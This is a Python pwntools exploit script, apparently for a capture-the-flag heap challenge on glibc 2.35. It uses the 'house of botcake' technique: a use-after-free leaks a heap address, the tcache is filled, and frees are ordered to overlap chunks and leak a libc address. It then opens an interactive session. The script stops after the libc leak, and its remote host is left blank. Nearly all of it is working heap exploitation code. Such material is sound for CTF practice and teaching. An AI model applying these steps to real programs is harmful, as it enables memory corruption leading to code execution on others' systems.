#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.35-1-x86_64.so")

context.binary = exe

# split tmux pane
# context.terminal = ["tmux", "splitw", "-vf","-p", "70"]
# spawn new window
context.terminal = ["tmux", "neww", "-n", "shell"]

#context.log_level = "debug"
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc "	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """

"""

if args.GDB:
    r = gdb.debug(exe.path,gdbscript=GDB_SCRIPT)
elif args.LOCAL:
    r = process(exe.path)
elif args.DOCKER:
    r = remote("localhost", DOCKER_PORT)
else:
    r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

def alloc(idx, size, msg):
	sla(b'> ','1') 
	sla(b'> ',str(idx).encode())
	sla(b'> ',str(size).encode())
	sla(b': ',msg)

def free(idx):
	sla(b'> ','2') 
	sla(b'> ',str(idx).encode())

def show(idx):
	sla(b'> ','3') 
	sla(b'> ',str(idx).encode())


def main():
	# house of botcake 
	# leak heap
	for i in range(7): 
		alloc(i, 0x100, b'a') # will be freed later and go in tcache
	
	free(0)
	show(0)
	heap = (u64(rl()[:-1].ljust(8, b'\x00')) << 12)
	aleak('heap', heap)

	alloc(0,  0x100, b'b') # realloc chunk used to leak heap 
	
	# create a -> will go in unsortedbin 
	# prev will consolidate with a when freed 
	# creating a chunk of 0x221 
	# requesting again 0x100 
	# and freeing will lead to a being in tcache (uaf) 
	# and also in unsortedbin 
	# request chunk of size 0x130 to hijack chunk fp 
	# next time we request 2 0x100 chunks 
	# the 2nd will be our arb location
	alloc(7,  0x100, b'prev') # prev 
	alloc(8,  0x100, b'a') # a

	alloc(9, 0x10, b'/bin/sh\x00') 

	# fill tcache 
	for i in range(7):
		free(i)

	# free chunk in unsortedbin 
	free(8)
	free(7)

	show(8) # leak libc


	r.interactive()


if __name__ == "__main__":
    main()
